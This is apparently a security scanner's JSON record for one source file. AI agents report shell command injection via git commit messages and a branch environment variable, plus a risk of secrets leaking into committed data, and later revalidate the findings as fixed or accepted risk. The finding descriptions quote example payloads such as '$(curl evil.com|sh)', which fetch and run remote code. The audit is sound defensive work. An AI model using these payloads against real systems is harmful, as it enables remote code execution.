@@ -1,0 +1,209 @@
+{
+  "filePath": "packages/deepsec/src/data-commit.ts",
+  "projectId": "deepsec",
+  "candidates": [
+    {
+      "vulnSlug": "rce",
+      "lineNumbers": [
+        16,
+        25,
+        31,
+        41,
+        47
+      ],
+      "snippet": "  const MAX_BUFFER = 256 * 1024 * 1024;\n\n  const status = execSync(\"git status --porcelain\", {\n    cwd: DATA_DIR,\n    encoding: \"utf-8\",",
+      "matchedPattern": "execSync"
+    },
+    {
+      "vulnSlug": "process-env-access",
+      "lineNumbers": [
+        5
+      ],
+      "snippet": "const DATA_DIR = path.resolve(\"data\");\nconst DATA_BRANCH = process.env.DEEPSEC_DATA_BRANCH ?? \"main\";\n",
+      "matchedPattern": "process.env.DEEPSEC_DATA_BRANCH"
+    },
+    {
+      "vulnSlug": "process-env-access",
+      "lineNumbers": [
+        11
+      ],
+      "snippet": "const REF_RE = /^[A-Za-z0-9._/-]+$/;\nconst RAW_BRANCH = process.env.DEEPSEC_DATA_BRANCH ?? \"main\";\nif (!REF_RE.test(RAW_BRANCH)) {",
+      "matchedPattern": "process.env.DEEPSEC_DATA_BRANCH"
+    }
+  ],
+  "lastScannedAt": "2026-05-06T21:46:56.681Z",
+  "lastScannedRunId": "20260506214655-aa977d40dc0c6524",
+  "fileHash": "26f1cb3557f118108ffced820bc507e8769f320c0ec72e6ba6ce361d4d41be6d",
+  "findings": [
+    {
+      "severity": "MEDIUM",
+      "vulnSlug": "rce",
+      "title": "Shell command injection via JSON.stringify in git commit message",
+      "description": "Line 31 builds a shell command string with `git commit -m ${JSON.stringify(message)}` and passes it to execSync, which spawns a shell. JSON.stringify only escapes `\"`, `\\`, and control characters \u2014 it does NOT escape `$`, backticks, or `!` (history expansion), all of which retain special meaning inside double-quoted shell strings. The message comes from callers like `enrich.ts`: `commitAndPushData(`enrich: ${projectId} (${result.enriched} files)`)`. `projectId` flows from `--project-id` CLI args, `deepsec.config.ts`, or the directory basename auto-derived during `init`. A `projectId` value such as `$(curl evil.com|sh)` or `` `whoami` `` would be wrapped by JSON.stringify into `\"...$(curl evil.com|sh)...\"` and the substitution would execute when the shell parses the command. The threat model classifies CLI args/config as trusted, so the realistic exploit is self-RCE rather than cross-user attack \u2014 but this is exactly the unsafe shell-interpolation pattern called out in CLAUDE.md, and it would become a real RCE the moment any caller hands in a sandbox-derived or otherwise less-trusted value.",
+      "lineNumbers": [
+        31
+      ],
+      "recommendation": "Use the array form of execFileSync to bypass the shell entirely: `execFileSync('git', ['commit', '-m', message], { cwd: DATA_DIR, ... })`. Apply the same fix to all execSync calls in this file.",
+      "confidence": "high",
+      "revalidation": {
+        "verdict": "fixed",
+        "reasoning": "The current file no longer imports or uses execSync for the git commit path. commitAndPushData now calls execFileSync(\"git\", [\"commit\", \"-m\", message], ...), so the commit message is passed as an argv element and is not parsed by a shell. The caller in packages/deepsec/src/commands/enrich.ts still builds the message from projectId, but that value now remains data, not shell syntax. A payload such as $(...) or backticks inside projectId would be included literally in the commit message. I could not inspect git history because /vercel/sandbox/target is not a git repository in this environment, but the current vulnerable string-shell construction described in the finding is absent. Under the stated trust model, projectId from CLI/config is also developer-controlled, but the current code has removed the unsafe shell interpolation regardless.",
+        "revalidatedAt": "2026-05-06T22:53:41.371Z",
+        "runId": "20260506225212-3e9b4ab06177a23a",
+        "model": "gpt-5.5"
+      }
+    },
+    {
+      "severity": "MEDIUM",
+      "vulnSlug": "rce",
+      "title": "Shell command injection via DEEPSEC_DATA_BRANCH environment variable",
+      "description": "Lines 41 and 47 interpolate the `DATA_BRANCH` constant \u2014 read from `process.env.DEEPSEC_DATA_BRANCH` at module load (line 5) \u2014 directly into shell command strings: `git pull --rebase origin ${DATA_BRANCH}` and `git push origin HEAD:${DATA_BRANCH}`. There is no validation that the value is a legitimate ref name. A value like `main; curl evil.com | sh` or `$(...)` causes arbitrary command execution. The env var is loaded via dotenv from `.env.local` at CLI startup (cli.ts L1-4); if a user pulls a repo that ships its own .env.local (or follows untrusted setup instructions to set it), this becomes the exploit vector. Like the JSON.stringify case, this is the brittle shell-interpolation pattern explicitly called out in the project threat model.",
+      "lineNumbers": [
+        5,
+        41,
+        47
+      ],
+      "recommendation": "Validate DATA_BRANCH against `^[A-Za-z0-9._/-]+$` (or stricter) at module load and throw on mismatch, AND switch to execFileSync with arg arrays so the value is never re-parsed by a shell: `execFileSync('git', ['pull', '--rebase', 'origin', DATA_BRANCH], ...)`.",
+      "confidence": "high",
+      "revalidation": {
+        "verdict": "fixed",
+        "reasoning": "The current code reads DEEPSEC_DATA_BRANCH into RAW_BRANCH and validates it against /^[A-Za-z0-9._/-]+$/ before assigning DATA_BRANCH. The git pull and push operations are performed with execFileSync argv arrays: [\"pull\", \"--rebase\", \"origin\", DATA_BRANCH] and [\"push\", \"origin\", `HEAD:${DATA_BRANCH}`]. Because no shell is involved, metacharacters such as semicolons, command substitutions, pipes, and spaces are not interpreted as commands. The regex also rejects the examples in the finding, including main; curl ... and $(...). The only remaining interpolation of DATA_BRANCH is in a console.error message that tells the user how to push manually, which is not command execution. I could not cite a historical commit because the workspace has no .git directory, but the current vulnerable shell-string calls are gone.",
+        "revalidatedAt": "2026-05-06T22:53:41.371Z",
+        "runId": "20260506225212-3e9b4ab06177a23a",
+        "model": "gpt-5.5"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "vulnSlug": "secrets-exposure",
+      "title": "Raw scanner snippets can be committed and pushed to the data repository",
+      "description": "commitAndPushData stages all changes under the deepsec data root with `git add -A` and pushes them to `origin`. File records written by the scanner include raw `CandidateMatch.snippet` values copied from scanned source, and the secret matchers intentionally match hardcoded credentials such as `password = \"...\"` or API keys. When `enrichCommand` calls commitAndPushData, any existing `data/<projectId>/files/*.json` records containing secret-bearing snippets can be committed and pushed to a remote data branch. This can leak secrets from the scanned repository into a separate committed data store, especially if that repository or branch is shared more broadly than the source repo. The git command execution itself is not shell-injectable because argv form is used and the branch is regex-validated; the issue is the unredacted sensitive content being committed.",
+      "lineNumbers": [
+        37,
+        61
+      ],
+      "recommendation": "Redact or omit raw snippets for secret-related candidates before writing file records, or exclude candidate snippets from committed data. Add a secret-scrubbing pass before `git add -A` and fail closed if known secret patterns remain in `data/<projectId>/files/*.json`.",
+      "confidence": "medium",
+      "producedByRunId": "20260506215246-d7ae5c7b1506afd5",
+      "revalidation": {
+        "verdict": "accepted-risk",
+        "reasoning": "ACCEPTED RISK (manual decision; documented in .deepsec/README.md `## Accepted risks`). data-commit.ts ships a `scrubCommittedDataDir()` pass that drops snippets for credential-finding matchers (SECRET_SLUGS) and fail-closes on any leftover credential-shaped string via CREDENTIAL_RE. The revalidator correctly notes that this is not airtight \u2014 a slug we don't enumerate (e.g., a future secret-bearing matcher) plus a credential format the regex doesn't match would still leak. We accept the residual risk because (1) `commitAndPushData` only ever runs against the deepsec data repo with explicit user/CI invocation, (2) the matcher-side fix would require restructuring CandidateMatch to carry a redact-by-default flag set at scanner time, and (3) the fail-closed CREDENTIAL_RE backstop catches the most common formats. Any new secret-finding matcher MUST be added to SECRET_SLUGS in data-commit.ts as part of its review.\n\n--- Original revalidation ---\nThe current code added scrubCommittedDataDir before git add -A, which substantially reduces the original leakage path, but it does not fully close it. Scanner records still contain CandidateMatch.snippet as required by packages/core/src/schemas.ts, and writeFileRecord persists the full record to data/<projectId>/files/*.json. The scrubber only redacts snippets for a fixed SECRET_SLUGS set and then applies CREDENTIAL_RE as a fallback. That set omits secret-oriented matchers such as tf-secret-in-data and secrets-plaintext-exposure, and the fallback regex does not cover all credential names, for example a Terraform kubernetes_secret data entry like token = \"long-plaintext-token-value\". In that concrete path, tf-secret-in-data writes the raw snippet, commitAndPushData walks the file, does not redact by slug, may not match CREDENTIAL_RE, then stages all data with git add -A and pushes it. The attacker model here is not remote code execution, but the project context explicitly calls token leakage into committed state a real concern. Therefore the finding remains real, although partially mitigated for several common slugs and credential formats.",
+        "revalidatedAt": "2026-05-06T00:00:00.000Z",
+        "runId": "20260506225212-3e9b4ab06177a23a",
+        "model": "manual"
+      }
+    }
+  ],
+  "analysisHistory": [
+    {
+      "runId": "20260502160808-9bbd",
+      "investigatedAt": "2026-05-02T16:13:40.892Z",
+      "durationMs": 208322,
+      "durationApiMs": 207548,
+      "agentType": "claude-agent-sdk",
+      "model": "claude-opus-4-7",
+      "modelConfig": {
+        "model": "claude-opus-4-7"
+      },
+      "agentSessionId": "b5f12bc1-6638-4dbb-b6a9-fcf123d53d73",
+      "findingCount": 2,
+      "numTurns": 11,
+      "costUsd": 0.721455,
+      "usage": {
+        "inputTokens": 10,
+        "outputTokens": 15055,
+        "cacheReadInputTokens": 244285,
+        "cacheCreationInputTokens": 35662
+      },
+      "refusal": {
+        "refused": false,
+        "skipped": [],
+        "raw": "```json\n{\"refused\": false, \"reason\": null, \"skipped\": []}\n```"
+      }
+    },
+    {
+      "runId": "20260506215246-d7ae5c7b1506afd5",
+      "investigatedAt": "2026-05-06T21:54:42.649Z",
+      "durationMs": 20765.8,
+      "agentType": "codex",
+      "model": "gpt-5.5",
+      "modelConfig": {
+        "model": "gpt-5.5"
+      },
+      "agentSessionId": "019dff47-8bda-7060-aa31-96333341fed1",
+      "findingCount": 1,
+      "numTurns": 0.2,
+      "phase": "process",
+      "costUsd": 0.1458454,
+      "usage": {
+        "inputTokens": 18553.8,
+        "outputTokens": 1049,
+        "cacheReadInputTokens": 43212.8,
+        "cacheCreationInputTokens": 0
+      },
+      "refusal": {
+        "refused": false,
+        "skipped": [],
+        "raw": "{\"refused\":false,\"skipped\":[]}"
+      },
+      "reinvestigateMarker": 10
+    },
+    {
+      "runId": "20260506223949-bd2cf1d45b776494",
+      "investigatedAt": "2026-05-06T22:42:31.375Z",
+      "durationMs": 31730,
+      "agentType": "codex",
+      "model": "gpt-5.5",
+      "modelConfig": {
+        "model": "gpt-5.5"
+      },
+      "agentSessionId": "019dff72-8994-7cb0-87ce-5db24fe83e1b",
+      "findingCount": 1,
+      "numTurns": 0.2,
+      "phase": "revalidate",
+      "costUsd": 0.1468248,
+      "usage": {
+        "inputTokens": 11902,
+        "outputTokens": 1811.4,
+        "cacheReadInputTokens": 65945.6,
+        "cacheCreationInputTokens": 0
+      },
+      "refusal": {
+        "refused": false,
+        "skipped": [],
+        "raw": "{\"refused\":false,\"skipped\":[]}"
+      }
+    },
+    {
+      "runId": "20260506225212-3e9b4ab06177a23a",
+      "investigatedAt": "2026-05-06T22:53:41.372Z",
+      "durationMs": 37636.5,
+      "agentType": "codex",
+      "model": "gpt-5.5",
+      "modelConfig": {
+        "model": "gpt-5.5"
+      },
+      "agentSessionId": "019dff7d-f5a0-7931-9667-8768dc99a05c",
+      "findingCount": 3,
+      "numTurns": 0.5,
+      "phase": "revalidate",
+      "costUsd": 0.184125,
+      "usage": {
+        "inputTokens": 19773,
+        "outputTokens": 2074,
+        "cacheReadInputTokens": 46080,
+        "cacheCreationInputTokens": 0
+      },
+      "refusal": {
+        "refused": false,
+        "skipped": [],
+        "raw": "{\"refused\":false,\"reason\":null,\"skipped\":[]}"
+      }
+    }
+  ],
+  "gitInfo": {
+    "recentCommitters": [],
+    "enrichedAt": "2026-05-06T22:53:41.375Z"
+  },
+  "status": "analyzed"
+}
